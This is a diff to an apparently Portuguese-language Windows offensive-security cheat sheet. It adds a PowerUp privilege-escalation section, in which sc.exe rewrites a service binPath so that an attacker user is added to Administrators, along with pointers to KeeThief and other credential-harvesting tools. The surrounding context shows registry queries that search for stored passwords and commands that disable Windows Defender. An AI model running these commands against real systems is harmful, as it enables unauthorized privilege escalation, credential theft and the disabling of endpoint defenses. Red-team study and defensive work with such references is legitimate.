@@ -66,7 +66,6 @@ ftp, ssh, vpn, git, .kdbx, .db
 
 - ``` reg query HKLM /f password /t REG_SZ /s ```
 
-
 - ``` reg query "HKCU\Software\ORL\WinVNC3\Passowrd" ```
  
 - ``` reg query "HKCU\Software\TightVNC\Server" ```
@@ -137,6 +136,43 @@ Depois de ativar a tela de bloqueio e fazer com que o alvo façam login novament
 REFS: 
 - [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/forcing-wdigest-to-store-credentials-in-plaintext](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/forcing-wdigest-to-store-credentials-in-plaintext)
 - [https://github.com/gentilkiwi/mimikatz/wiki](https://github.com/gentilkiwi/mimikatz/wiki)
+
+
+### PowerUp
+
+```
+Enumeration: Get-ModifiableService
+Abuse: Invoke-ServiceAbuse -Name <Service> | fl
+```
+
+Save the original binPath:
+```sc.exe qc <Svc>```
+
+Signal the service to stop:
+```sc.exe stop <Svc>```
+
+Modify binPath to trigger a malicious command:
+```sc.exe config <VulnSvc> binPath= “net localgroup Administrators harmj0y /add”```
+
+Restart the service:
+```sc.exe start <Svc>```
+
+Repeat this process for as many command as needed, restore the original service binPath
+
+```
+Enumeration: Get-ModifiableServiceFile
+Abuse: Install-ServiceBinary -Name <Service> | fl
+
+PowerUp: Find-PathDLLHijack
+PowerUp: Get-UnattendedInstallFile
+PowerUp: Get-CachedGPPPassword
+PowerUp: Get-SiteListPassword
+PowerUp: Invoke-PrivescAudit
+```
+
+- https://gist.github.com/HarmJ0y/7363509435f5700d713ee351bb4fcd8f
+- https://gist.github.com/HarmJ0y/0d82cc27953821da8d4a27c0c9a90cea
+
 
 
 ### Disabling Windows Defender(some examples from attack reports)
@@ -232,6 +268,10 @@ rem added the following on 07/25/19 for win10v1903
 reg add "HKLM\System\CurrentControlSet\Services\Sense" /v "Start" /t REG_DWORD /d "4" /f
 reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f
 ```
+
+### UAC Bypass
+
+
 
 
 ### Cheatsheet commands
@@ -367,6 +407,10 @@ mimikatz # sekurlsa::credman
 - A tool SessionGopher ([https://github.com/fireeye/SessionGopher](https://github.com/fireeye/SessionGopher)) pode pegar hostnames e senhas salvas do WinSCP, PuTTY, SuperPuTTY, FileZilla, e Microsoft Remote Desktop.
 
 - InternalMonologue tool (Retrieving NTLM Hashes without Touching LSASS) [https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)
+
+- KeeThief is a PowerShell Version 2.0 compatible toolkit (extract KeePass db) ([https://blog.harmj0y.net/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/](https://blog.harmj0y.net/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/))
+
+- Recently used files, mounted volumes, Putty configs, detailed process info, RDP connection hints, RDP drive redirections, network connections ([https://gist.github.com/leechristensen/10999daab91b3b34108a9e7201838452](https://gist.github.com/leechristensen/10999daab91b3b34108a9e7201838452))
 
 
 
